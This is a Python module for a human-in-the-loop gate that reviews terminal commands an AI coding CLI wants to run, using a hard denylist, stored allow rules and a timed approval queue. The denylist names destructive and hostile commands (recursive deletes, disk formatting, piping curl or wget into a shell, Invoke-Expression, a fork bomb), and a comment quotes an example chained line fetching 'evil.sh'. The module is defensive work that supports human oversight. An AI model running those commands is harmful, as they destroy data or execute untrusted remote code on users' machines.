"""
The terminal-command gate for the Antigravity CLI.

`agy` can write files on its own, but a real project also needs commands run —
`npm install`, a build step, a test run. Those used to be soft-denied, because
`agy` asks permission before running anything and an unattended pipeline has
nobody to answer, so the answer defaulted to no. That made Jarvis good for
"write me these files" and useless for "install it and build it".

This module is the answer to that question instead. `agy` is configured with a
PreToolUse hook (see `scripts/agy_command_gate.py`) that hands every command it
wants to run to Jarvis before running it. Jarvis decides:

  * a command matching the hard denylist is refused outright and only logged —
    no page, no prompt, nothing that a stray click could let through;
  * a command covered by an "always allow" rule goes straight through;
  * anything else is parked, shown on the Commands page with the pipeline that
    asked for it, and waits for a real answer.

Nothing waits forever. A parked command that goes unanswered for
`WAIT_SECONDS` is denied, `agy` is told it was denied, and the pipeline carries
on and reports honestly that the step did not happen — which is the whole point
of returning a refusal loudly rather than letting a build claim success.

The policy lives here; the log and the standing rules live in the database, and
the HTTP surface lives in jarvis.py.
"""
import os
import re
import threading
import time
import uuid
from datetime import datetime, timezone

import db

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "second_brain.db")

# How long a command sits on the Commands page before it is denied. Ten minutes
# is long enough to walk back to the machine and short enough that a pipeline
# started and forgotten does not hold the `agy` lock all night.
WAIT_SECONDS = int(os.getenv("JARVIS_COMMAND_WAIT", "600"))


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# HARD DENYLIST — refused before anyone is asked.
#
# These never reach the Commands page, and no "always allow" rule can cover
# them, because the cost of one mis-click on any of them is not recoverable by
# looking at a git diff afterwards. Everything else is a decision for the user;
# this list is deliberately short and deliberately not editable from the UI.
# ---------------------------------------------------------------------------
_DENYLIST: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\brm\s+(?:-\w*\s+)*-\w*[rf]\w*\s+(?:-\w+\s+)*(?:/|~|\*|[a-z]:[\\/])", re.I),
     "Recursive delete aimed at a drive root, your home folder or a wildcard."),
    (re.compile(r"\b(?:del|erase)\b(?=[^\n]*\s/[sq]\b)[^\n]*\s(?:[a-z]:\\|\\\\|%\w+%)", re.I),
     "Recursive Windows delete outside a project folder."),
    (re.compile(r"\b(?:rd|rmdir)\b[^\n]*\s/s\b", re.I),
     "Recursive directory removal."),
    (re.compile(r"\b(?:format|diskpart|mkfs(?:\.\w+)?|fdisk)\b", re.I),
     "Disk formatting or partitioning."),
    (re.compile(r"\b(?:shutdown|reboot|halt|poweroff)\b", re.I),
     "Shutting down or restarting the machine."),
    (re.compile(r"\bgit\s+push\b[^\n]*(?:--force(?!-with-lease)|(?<!\w)-f(?!\w))", re.I),
     "Force push — rewrites history on a remote where it cannot be undone."),
    (re.compile(r"\b(?:curl|wget|iwr|invoke-webrequest)\b[^\n]*\|\s*(?:sudo\s+)?(?:ba|z|d|k)?sh\b", re.I),
     "Piping something downloaded off the internet straight into a shell."),
    (re.compile(r"\b(?:iex|invoke-expression)\b", re.I),
     "PowerShell Invoke-Expression — runs text as code."),
    (re.compile(r"\b(?:sudo|runas|takeown|icacls)\b", re.I),
     "Elevating privileges or changing ownership."),
    (re.compile(r"\breg\s+(?:add|delete|import)\b|\bnetsh\b|\bbcdedit\b", re.I),
     "Editing the Windows registry, firewall or boot configuration."),
    (re.compile(r":\(\)\s*\{.*\|.*&.*\}\s*;?\s*:", re.S),
     "Fork bomb."),
    (re.compile(r"\bgit\s+config\b[^\n]*\bcredential", re.I),
     "Touching stored git credentials."),
]

# Jarvis's own source is off limits to the builder. Folder trust already keeps
# `agy` inside one project (see connectors/antigravity.py), and this is the
# second lock on the same door: a command that names the repository root
# without staying inside "Let Jarvis Handle It" is refused.
_PROJECTS_ROOT = os.path.join(BASE_DIR, "Let Jarvis Handle It")


def _touches_jarvis_source(command: str) -> bool:
    lowered = command.replace("/", "\\").lower()
    root = BASE_DIR.replace("/", "\\").lower()
    if root not in lowered:
        return False
    projects = _PROJECTS_ROOT.replace("/", "\\").lower()
    # Every mention of the repo root has to be a mention of a project inside it.
    for match in re.finditer(re.escape(root), lowered):
        if not lowered[match.start():].startswith(projects):
            return True
    return False


def denied_reason(command: str) -> str | None:
    """Why this command is refused outright, or None if it may be asked about."""
    for pattern, why in _DENYLIST:
        if pattern.search(command):
            return why
    if _touches_jarvis_source(command):
        return "Reaches into Jarvis's own source instead of staying in the project folder."
    return None


def denylist_descriptions() -> list[str]:
    """The plain-English denylist, for showing on the Commands page."""
    return [why for _, why in _DENYLIST] + [
        "Reaches into Jarvis's own source instead of staying in the project folder."
    ]


# ---------------------------------------------------------------------------
# Normalising a command line
# ---------------------------------------------------------------------------

# A shell line can carry several commands. Allowing `npm install` must never
# allow `npm install && curl evil.sh | sh`, so the line is split first and every
# part has to pass on its own.
_SEPARATORS = re.compile(r"&&|\|\||;|\||\n|(?<!\w)&(?!\w)")

# Second words that are a mode rather than the actual job — `npm run build` and
# `npm run deploy` are different things and should be approved separately.
_PASSTHROUGH_SUBCOMMANDS = {"run", "run-script", "exec", "x", "dlx", "-m"}


def split_segments(command: str) -> list[str]:
    """Split a command line into the individual commands it would run.

    Quoted text is left alone, so a separator inside an argument does not
    fool the split into seeing a command that is not there.
    """
    parts, current, quote = [], [], None
    i = 0
    while i < len(command):
        ch = command[i]
        if quote:
            current.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in "\"'":
            quote = ch
            current.append(ch)
            i += 1
            continue
        match = _SEPARATORS.match(command, i)
        if match:
            parts.append("".join(current))
            current = []
            i = match.end()
            continue
        current.append(ch)
        i += 1
    parts.append("".join(current))
    return [p.strip() for p in parts if p.strip()]


def _tokens(segment: str) -> list[str]:
    """Words of a command, with a quoted path kept together as one word.

    `"C:\\Program Files\\nodejs\\npm.exe" install` has to read as npm being run,
    not as a program called `C:\\Program` — otherwise its signature would be
    nonsense and no rule could ever match it.
    """
    return [t for t in re.findall(r'"[^"]*"|\'[^\']*\'|\S+', segment.strip()) if t]


def _is_subcommand(token: str) -> bool:
    """Whether a word names a mode of the program rather than a file it acts on."""
    if not token or token.startswith(("-", "/", "\\", "$", "%", "\"", "'")):
        return False
    return re.fullmatch(r"[A-Za-z][\w-]*", token) is not None


def signature(segment: str) -> str:
    """The form rules match on: the program, plus its subcommand when it has one.

    `npm install lodash` and `npm install react` share the signature
    `npm install`, so one answer covers both. `npm run build` keeps the third
    word, because running a different script is a different decision.
    """
    tokens = _tokens(segment)
    if not tokens:
        return ""
    # Drop leading VAR=value assignments — the program is what matters.
    while tokens and re.fullmatch(r"\w+=.*", tokens[0]):
        tokens.pop(0)
    if not tokens:
        return ""

    program = os.path.basename(tokens[0].strip("\"'")).lower()
    if program.endswith(".exe"):
        program = program[:-4]
    parts = [program]

    if len(tokens) > 1 and _is_subcommand(tokens[1]):
        sub = tokens[1].lower()
        parts.append(sub)
        if sub in _PASSTHROUGH_SUBCOMMANDS and len(tokens) > 2 and _is_subcommand(tokens[2]):
            parts.append(tokens[2].lower())
    return " ".join(parts)


def line_signature(command: str) -> str:
    """One readable signature for a whole line, for logging and for rules."""
    segments = split_segments(command)
    return " && ".join(signature(s) for s in segments if signature(s))


# ---------------------------------------------------------------------------
# Standing rules
# ---------------------------------------------------------------------------

def _rule_signatures(project: str | None) -> set[str]:
    conn = db.get_connection(DB_PATH)
    try:
        rules = db.get_command_rules(conn)
    finally:
        conn.close()
    return {
        r["signature"] for r in rules
        if not r["scope"] or r["scope"] == (project or "")
    }


def covered_by_rules(command: str, project: str | None) -> bool:
    """Whether every part of this command line is already always-allowed."""
    segments = split_segments(command)
    if not segments:
        return False
    allowed = _rule_signatures(project)
    if not allowed:
        return False
    return all(signature(s) in allowed for s in segments)


# ---------------------------------------------------------------------------
# The waiting room
#
# A command that has to be asked about lives here — in memory, in the Jarvis
# process — while the hook that asked blocks on its event. Once decided it is
# written to the log and dropped from this dict.
# ---------------------------------------------------------------------------

_PENDING: dict[str, dict] = {}
_PENDING_LOCK = threading.Lock()


def pending() -> list[dict]:
    """Everything currently waiting for an answer, oldest first."""
    with _PENDING_LOCK:
        items = [
            {k: v for k, v in item.items() if k != "event"}
            for item in _PENDING.values()
        ]
    items.sort(key=lambda i: i["asked_ts"])
    now = time.time()
    for item in items:
        item["waited"] = int(now - item["asked_ts"])
        item["expires_in"] = max(0, int(item["deadline"] - now))
    return items


def _overrides(command: str) -> list[str]:
    """The grant that actually lets an approved command run.

    Answering "allow" is not by itself enough. In headless mode the CLI has
    nobody to prompt, so it auto-denies a terminal command regardless of what a
    hook decided — its own refusal says to "add an allow-rule under
    permissions.allow in settings.json (e.g. command(<target>))". A PreToolUse
    hook can hand back exactly that as a temporary grant, which is what this
    builds: one per part of the line plus one for the line as a whole, so it
    matches whichever form the CLI compares against.

    Nothing here widens what was approved — these are generated from the
    command that was just answered, and they last for that one call.
    """
    grants = [f"command({segment})" for segment in split_segments(command)]
    whole = f"command({command})"
    if whole not in grants:
        grants.append(whole)
    return grants


def _record(item: dict, decision: str, decided_by: str, reason: str) -> None:
    conn = db.get_connection(DB_PATH)
    try:
        db.log_command(conn, {
            "request_id": item["request_id"],
            "command": item["command"],
            "signature": item["signature"],
            "project": item.get("project"),
            "plan_id": item.get("plan_id"),
            "section_id": item.get("section_id"),
            "conversation_id": item.get("conversation_id"),
            "decision": decision,
            "decided_by": decided_by,
            "reason": reason,
            "asked_at": item["asked_at"],
            "decided_at": _now(),
        })
    finally:
        conn.close()


def ask(command: str, project: str | None = None, plan_id: str | None = None,
        section_id: str | None = None, conversation_id: str | None = None,
        cwd: str | None = None, on_change=None) -> dict:
    """Decide whether `agy` may run this command. Blocks while a person decides.

    Returns `{"decision": "allow"|"deny", "reason": str}` — the shape the hook
    hands back to `agy`.
    """
    command = (command or "").strip()
    if not command:
        return {"decision": "deny", "reason": "No command was given to review."}

    item = {
        "request_id": uuid.uuid4().hex[:12],
        "command": command,
        "signature": line_signature(command),
        "segments": split_segments(command),
        "project": project or "",
        "plan_id": plan_id or "",
        "section_id": section_id or "",
        "conversation_id": conversation_id or "",
        "cwd": cwd or "",
        "asked_at": _now(),
        "asked_ts": time.time(),
        "deadline": time.time() + WAIT_SECONDS,
    }

    blocked = denied_reason(command)
    if blocked:
        _record(item, "rejected", "denylist", blocked)
        if on_change:
            on_change()
        return {"decision": "deny", "reason": (
            f"Refused automatically: {blocked} This is on Jarvis's hard denylist and cannot "
            "be approved. Do the job another way, or tell the user it needs doing by hand."
        )}

    if covered_by_rules(command, project):
        _record(item, "allowed", "rule", "Covered by an existing 'always allow'.")
        if on_change:
            on_change()
        return {"decision": "allow", "reason": "Already always-allowed.",
                "overrides": _overrides(command)}

    event = threading.Event()
    item["event"] = event
    with _PENDING_LOCK:
        _PENDING[item["request_id"]] = item
    if on_change:
        on_change()

    answered = event.wait(timeout=WAIT_SECONDS)

    with _PENDING_LOCK:
        resolved = _PENDING.pop(item["request_id"], item)

    if not answered:
        _record(resolved, "rejected", "timeout",
                f"Nobody answered within {WAIT_SECONDS // 60} minutes.")
        if on_change:
            on_change()
        return {"decision": "deny", "reason": (
            "Denied: this command waited for approval and nobody answered in time. It did "
            "NOT run. Carry on with what you can do without it, and say plainly in your "
            "final answer which step did not happen."
        )}

    decision = resolved.get("decision")
    why = resolved.get("reason") or ""
    if decision == "allow":
        _record(resolved, "allowed", "user", why)
        if on_change:
            on_change()
        return {"decision": "allow", "reason": why or "Approved.",
                "overrides": _overrides(command)}

    _record(resolved, "rejected", "user", why)
    if on_change:
        on_change()
    said = f' They said: "{why.rstrip(".")}".' if why else ""
    return {"decision": "deny", "reason": (
        f"The user refused this command.{said} It did NOT run. Do not try a variation of it "
        "to get around the refusal — work without it and say in your final answer what could "
        "not be done."
    )}


def decide(request_id: str, decision: str, reason: str = "",
           project_scope: bool = False) -> dict:
    """Answer one waiting command from the Commands page.

    `decision` is "allow", "always" or "reject". "always" allows this one and
    stores a rule so the same command goes through unasked next time.
    """
    decision = (decision or "").strip().lower()
    if decision not in ("allow", "always", "reject"):
        return {"error": f"'{decision}' is not one of allow, always or reject."}

    with _PENDING_LOCK:
        item = _PENDING.get(request_id)
        if not item:
            return {"error": "That command is no longer waiting — it timed out or was "
                             "already answered."}
        item["decision"] = "allow" if decision in ("allow", "always") else "reject"
        item["reason"] = (reason or "").strip()

    stored_rules = []
    if decision == "always":
        scope = item.get("project", "") if project_scope else ""
        conn = db.get_connection(DB_PATH)
        try:
            for segment in item["segments"]:
                sig = signature(segment)
                # Belt and braces: a rule must never be created for something the
                # denylist would refuse anyway.
                if sig and not denied_reason(segment):
                    db.add_command_rule(conn, sig, scope, item["reason"])
                    stored_rules.append(sig)
        finally:
            conn.close()

    item["event"].set()
    return {
        "status": "ok",
        "decision": decision,
        "request_id": request_id,
        "rules_added": stored_rules,
    }


def cancel(project: str | None = None, conversation_id: str | None = None) -> int:
    """Release anything still waiting for a run that has already gone away.

    A delegated build that times out or is killed leaves its hook process dead;
    without this the command would sit on the Commands page until its own
    deadline with nothing on the other end left to receive the answer. Called
    when a build finishes, so the page only ever shows live questions.
    """
    with _PENDING_LOCK:
        items = [
            i for i in _PENDING.values()
            if (project and i.get("project") == project)
            or (conversation_id and i.get("conversation_id") == conversation_id)
        ]
    for item in items:
        item["decision"] = "reject"
        item["reason"] = "The build that asked for this had already stopped."
        item["event"].set()
    return len(items)
